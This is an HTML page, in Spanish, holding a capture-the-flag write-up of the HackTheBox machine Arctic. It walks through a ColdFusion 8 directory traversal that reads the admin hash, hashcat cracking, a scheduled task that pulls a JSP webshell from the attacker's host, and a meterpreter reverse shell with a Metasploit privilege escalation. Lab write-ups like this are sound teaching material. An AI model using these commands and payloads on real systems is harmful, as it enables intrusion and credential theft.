@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Arctic — HackTheBox Writeup | Brandeiks</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina Arctic de HackTheBox (Windows Server 2008 R2, Fácil): directory traversal en ColdFusion 8 (CVE-2010-2861) filtra el hash del admin, una tarea programada despliega un webshell JSP, y CVE-2019-1458 (wizardopium) escala a SYSTEM.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/facil/arctic.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="Arctic — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina Arctic de HackTheBox (Windows Server 2008 R2, Fácil): directory traversal en ColdFusion 8 (CVE-2010-2861) filtra el hash del admin, una tarea programada despliega un webshell JSP, y CVE-2019-1458 (wizardopium) escala a SYSTEM.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/facil/arctic.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/arctic.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Arctic — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina Arctic de HackTheBox (Windows Server 2008 R2, Fácil): directory traversal en ColdFusion 8 (CVE-2010-2861) filtra el hash del admin, una tarea programada despliega un webshell JSP, y CVE-2019-1458 (wizardopium) escala a SYSTEM.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/arctic.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Arctic — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina Arctic de HackTheBox (Windows Server 2008 R2, Fácil): directory traversal en ColdFusion 8 (CVE-2010-2861) filtra el hash del admin, una tarea programada despliega un webshell JSP, y CVE-2019-1458 (wizardopium) escala a SYSTEM.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/arctic.html", "image": "https://brandeiks.github.io/assets/og/arctic.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/facil/arctic.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../herramientas/index.html" class="nav-back">HERRAMIENTAS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>arctic</span>
+    </div>
+    <h1 class="writeup-title">ARC<span>TIC</span></h1>
+    <p class="writeup-subtitle">// Traversal en ColdFusion 8 → tarea programada → webshell JSP → wizardopium → SYSTEM</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-windows">WINDOWS SERVER 2008 R2</span>
+      <span class="meta-badge badge-cve">CVE-2010-2861</span>
+      <span class="meta-badge badge-msf">CVE-2019-1458</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · Reconocimiento</a></li>
+        <li><a href="#traversal">02 · Traversal y crackeo</a></li>
+        <li><a href="#panel">03 · Panel y tarea programada</a></li>
+        <li><a href="#escalada">04 · Escalada: wizardopium</a></li>
+        <li><a href="#cmdref">05 · Referencia Comandos</a></li>
+        <li><a href="#glosario">06 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Arctic</span></div>
+      <div class="info-row"><span class="info-label">SISTEMA</span><span class="info-val val-cyan">Windows Server 2008 R2</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-green">Fácil</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">SERVICIO</span><span class="info-val val-yellow">Adobe ColdFusion 8 (8500)</span></div>
+      <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">CVE-2010-2861 / CVE-2019-1458</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">traversal → <span>password.properties</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">hashcat → <span>admin:happyday</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">tarea programada → <span>shell.jsp</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">RCE → <span>arctic\tolis</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>CVE-2019-1458</span> → SYSTEM</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+    <!-- ===================== 01 RECONOCIMIENTO ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">ESCANEO (MÁQUINA LENTA)</span>
+      </div>
+      <div class="cmd-block" data-cmd="sudo nmap -p- -n -Pn -sS --min-rate 3000 --max-retries 1 10.129.5.209">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -n -Pn -sS --min-rate</span> <span class="arg">3000</span> <span class="flag">--max-retries</span> <span class="arg">1</span> <span class="arg">10.129.5.209</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>135/tcp   open  msrpc</div>
+        <div><span class="o-green">8500/tcp  open  fmtp   JRun Web Server (Adobe ColdFusion 8)</span></div>
+        <div>49154/tcp open  msrpc</div>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// NOTA</p>
+        <p>
+          Un <strong>8500 con JRun/ColdFusion 8</strong> es casi un cartel: ir directo a
+          <code>/CFIDE/administrator/enter.cfm</code>. La máquina responde lento: conviene usar timeouts amplios
+          (60–120 s) en cada petición.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 02 TRAVERSAL Y CRACKEO ===================== -->
+    <div class="section" id="traversal">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Traversal y crackeo</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">LEER PASSWORD.PROPERTIES (CVE-2010-2861)</span>
+      </div>
+      <div class="cmd-block" data-cmd="UP=$(printf '../%.0s' $(seq 1 13)); curl -s &quot;http://10.129.5.209:8500/CFIDE/administrator/enter.cfm?locale=${UP}ColdFusion8/lib/password.properties%00en&quot;">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">TRAVERSAL</span>
+        <div><span class="prompt">$ </span><span class="cmd">UP=$(printf <span class="arg">'../%.0s'</span> $(seq 1 13))</span></div>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="flag">-s</span> <span class="arg">"http://10.129.5.209:8500/CFIDE/administrator/enter.cfm?locale=${UP}ColdFusion8/lib/password.properties%00en"</span></span></div>
+      </div>
+      <div class="output-block">
+        <div>password=<span class="o-green">2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03</span></div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// CVE-2010-2861 — DIRECTORY TRAVERSAL</p>
+        <p>
+          <strong>Dónde:</strong> el parámetro <code>locale</code> de <code>enter.cfm</code>, sin saneado.<br>
+          <strong>Qué permite:</strong> leer cualquier fichero del sistema con permisos del proceso ColdFusion —
+          incluido <code>password.properties</code>, con el <strong>hash SHA-1 del administrador</strong>.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">ROMPER EL HASH</span>
+      </div>
+      <div class="cmd-block" data-cmd="echo 2f635f6d20e3fde0c53075a84b68fb07dcec9b03 > /tmp/ar_hash.txt; hashcat -m 100 -a 0 /tmp/ar_hash.txt /usr/share/wordlists/rockyou.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">HASHCAT</span>
+        <div><span class="prompt">$ </span><span class="cmd">hashcat <span class="flag">-m</span> <span class="arg">100</span> <span class="flag">-a</span> <span class="arg">0</span> <span class="arg">/tmp/ar_hash.txt /usr/share/wordlists/rockyou.txt</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">happyday</span>   <span class="comment"># admin:happyday</span></div>
+      </div>
+    </div>
+
+    <!-- ===================== 03 PANEL Y TAREA PROGRAMADA ===================== -->
+    <div class="section" id="panel">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Panel y tarea programada</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">LOGIN CON HASH CALCULADO EN CLIENTE</span>
+      </div>
+      <div class="prose">
+        <p>
+          El formulario de ColdFusion no envía la contraseña en claro: calcula
+          <code>hex_hmac_sha1(salt, hex_sha1(password))</code> con JavaScript antes de enviarlo. Hay que reproducir
+          exactamente ese cálculo en Python.
+        </p>
+      </div>
+      <div class="cmd-block" data-cmd="sha = hashlib.sha1(b&quot;happyday&quot;).hexdigest().upper()  # hexcase=1: MAYUSCULAS
+pw  = hmac.new(salt.encode(), sha.encode(), hashlib.sha1).hexdigest().upper()
+# POST cfadminUserId=admin, cfadminPassword=pw, salt=salt, submit=Login">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">PYTHON</span>
+        <div><span class="comment"># sha1.js del servidor define hexcase = 1 → el hash va en MAYÚSCULAS</span></div>
+      </div>
+      <div class="warn-box">
+        <p class="warn-box-title">// OJO</p>
+        <p>
+          Con el hash en minúsculas el login <strong>siempre falla</strong>, sin ningún mensaje de error claro.
+          El detalle de <code>hexcase = 1</code> en <code>sha1.js</code> es el que lo explica.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">TAREA PROGRAMADA: DESCARGAR Y PUBLICAR UN JSP</span>
+      </div>
+      <div class="prose">
+        <p>
+          El panel autenticado permite crear una tarea (<em>Scheduled Task</em>) que pide una URL y, con
+          <code>publish=1</code> y <code>publish_file</code>, <strong>guarda la respuesta como archivo</strong> en una
+          ruta del servidor — si esa ruta está dentro del webroot, el resultado es RCE.
+        </p>
+      </div>
+      <div class="cmd-block" data-cmd="data = {
+  &quot;TaskName&quot;: &quot;shell2&quot;, &quot;ScheduleType&quot;: &quot;Once&quot;,
+  &quot;Operation&quot;: &quot;HTTPRequest&quot;,
+  &quot;ScheduledURL&quot;: &quot;http://10.10.16.12:8000/shell.jsp&quot;,
+  &quot;publish&quot;: &quot;1&quot;,
+  &quot;publish_file&quot;: r&quot;C:\ColdFusion8\wwwroot\CFIDE\shell.jsp&quot;,
+  &quot;adminsubmit&quot;: &quot;Submit&quot;,
+}
+# POST a scheduleedit.cfm, luego:
+# GET /CFIDE/administrator/scheduler/scheduletasks.cfm?runtask=shell2&timeout=50">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">SCHEDULED TASK</span>
+        <div class="comment"># publish="1" (no "on") y publish_file dentro del webroot CFIDE</div>
+      </div>
+      <div class="cmd-block" data-cmd="curl 'http://10.129.5.209:8500/CFIDE/shell.jsp?c=whoami'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">RCE</span>
+        <div><span class="prompt">$ </span><span class="cmd">curl <span class="arg">'http://10.129.5.209:8500/CFIDE/shell.jsp?c=whoami'</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">arctic\tolis</span></div>
+      </div>
+      <div class="vuln-box">
+        <p class="vuln-box-title">// ESCRITURA ARBITRARIA DE ARCHIVOS → RCE</p>
+        <p>
+          <strong>Dónde:</strong> la función <em>publish</em> de las tareas programadas de ColdFusion.<br>
+          <strong>Qué permite:</strong> escribir el resultado de una petición HTTP en cualquier ruta que el proceso
+          pueda crear — si cae dentro del webroot y es un JSP, se ejecuta.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 04 ESCALADA: WIZARDOPIUM ===================== -->
+    <div class="section" id="escalada">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Escalada: wizardopium</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">DE WEBSHELL A METERPRETER Y CVE-2019-1458</span>
+      </div>
+      <div class="cmd-block" data-cmd="msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f exe -o /tmp/ar_shell.exe; use exploit/windows/local/cve_2019_1458_wizardopium; set SESSION 1; set LHOST 10.10.16.12; set LPORT 8888; exploit -j">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">METASPLOIT</span>
+        <div><span class="prompt">$ </span><span class="cmd">msfvenom <span class="flag">-p</span> <span class="arg">windows/x64/meterpreter/reverse_tcp</span> <span class="arg">LHOST=10.10.16.12 LPORT=4444</span> <span class="flag">-f</span> <span class="arg">exe</span> <span class="flag">-o</span> <span class="arg">/tmp/ar_shell.exe</span></span></div>
+        <div class="comment"># descargado en la víctima con certutil desde el webshell, y ejecutado → sesión tolis</div>
+        <div><span class="prompt">msf6 &gt; </span><span class="cmd">use exploit/windows/local/cve_2019_1458_wizardopium</span></div>
+        <div><span class="prompt">msf6 &gt; </span><span class="cmd">set SESSION <span class="arg">1</span></span></div>
+        <div><span class="prompt">msf6 &gt; </span><span class="cmd">exploit <span class="flag">-j</span></span></div>
+      </div>
+      <div class="output-block">
+        <div><span class="o-green">Meterpreter session 8 opened (NT AUTHORITY\SYSTEM @ ARCTIC)</span></div>
+        <div><span class="o-cyan">[flag oculta]</span>   <span class="comment"># C:\Users\tolis\Desktop\user.txt</span></div>
+        <div><span class="o-cyan">[flag oculta]</span>   <span class="comment"># C:\Users\Administrator\Desktop\root.txt</span></div>
+      </div>
+      <div class="warn-box">
+        <p class="warn-box-title">// OJO</p>
+        <p>
+          El writeup de referencia usa MS10-059 (Chimichurri), pero el módulo no estaba disponible en esta Kali y
+          MS16-032/MS16-075 ejecutaban sin elevar. <strong>CVE-2019-1458 (wizardopium)</strong> sí dio SYSTEM en este
+          Server 2008 R2 x64. El panel también abre varias sesiones del mismo usuario: hay que entrar en la que
+          devuelve <code>NT AUTHORITY\SYSTEM</code>, no en la primera.
+        </p>
+      </div>
+      <div class="info-box">
+        <p class="info-box-title">// FLAGS</p>
+        <p>
+          <strong>user:</strong> [flag oculta] · <strong>root:</strong> [flag oculta].
+          Ruta completa: traversal en ColdFusion 8 → hash SHA-1 del admin → panel → tarea programada → JSP en el
+          webroot → <code>tolis</code> → CVE-2019-1458 → SYSTEM.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 05 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Referencia Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">Directory traversal (locale)</div>
+          <div class="cmd-ref-syntax">enter.cfm?locale=../../../ruta/absoluta%00en</div>
+          <div class="cmd-ref-desc">Explota CVE-2010-2861 para leer ficheros arbitrarios fuera del directorio esperado.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">hashcat -m 100</div>
+          <div class="cmd-ref-syntax">hashcat -m 100 -a 0 hash.txt lista.txt</div>
+          <div class="cmd-ref-desc">Modo de hashcat para SHA-1 sin sal, el formato del password.properties de ColdFusion.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">Scheduled Tasks de ColdFusion</div>
+          <div class="cmd-ref-syntax">ScheduledURL + publish=1 + publish_file=&lt;ruta&gt;</div>
+          <div class="cmd-ref-desc">Funcionalidad legítima del panel que descarga una URL y la guarda como archivo en el servidor — RCE si cae en el webroot.</div>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">cve_2019_1458_wizardopium</div>
+          <div class="cmd-ref-syntax">use exploit/windows/local/cve_2019_1458_wizardopium ; set SESSION N ; exploit</div>
+          <div class="cmd-ref-desc">Módulo de escalada local de Metasploit para CVE-2019-1458, efectivo en Windows sin parches de 2019.</div>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ===================== 06 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">Adobe ColdFusion</div>
+          <div class="glos-def">
+            Plataforma de desarrollo web de Adobe con su propio lenguaje (CFML). La versión 8, sin soporte desde hace
+            años, arrastra varias vulnerabilidades críticas conocidas.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE-2010-2861</div>
+          <div class="glos-def">
+            Directory traversal en el administrador de ColdFusion a través del parámetro <code>locale</code>, que
+            permite leer archivos arbitrarios del servidor, incluidos ficheros de credenciales.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">hex_hmac_sha1 (login en cliente)</div>
+          <div class="glos-def">
+            Esquema donde el formulario calcula un HMAC-SHA1 de la contraseña con un salt antes de enviarlo, en vez de
+            mandar la contraseña en claro — hay que reproducir el cálculo exacto (mayúsculas/minúsculas incluidas) para automatizarlo.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Scheduled Task (publish)</div>
+          <div class="glos-def">
+            Funcionalidad de ColdFusion para programar tareas que descargan una URL periódicamente. Su opción
+            <code>publish</code> guarda la respuesta como archivo, lo que la convierte en una primitiva de escritura.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE-2019-1458 (wizardopium)</div>
+          <div class="glos-def">
+            Vulnerabilidad de escalada de privilegios en el kernel de Windows (win32k.sys), corregida en diciembre de
+            2019, usada aquí para pasar de un usuario estándar a SYSTEM.
+          </div>
+        </div>
+
+      </div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="active.html"><span class="dir">← ANTERIOR</span><span class="nombre">Active</span></a></div>
+<section class="relacionados"><h2>// RELACIONADOS POR ETIQUETAS</h2><div class="rel-grid"><a class="rel-card" href="active.html"><span class="nombre">Active</span><span class="meta">hackthebox · facil · Active Directory</span></a><a class="rel-card" href="devel.html"><span class="nombre">Devel</span><span class="meta">hackthebox · facil · Metasploit</span></a></div></section>
+</main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de Arctic · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "ARCTIC", "plataforma": "hackthebox", "dificultad": "facil", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/arctic.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
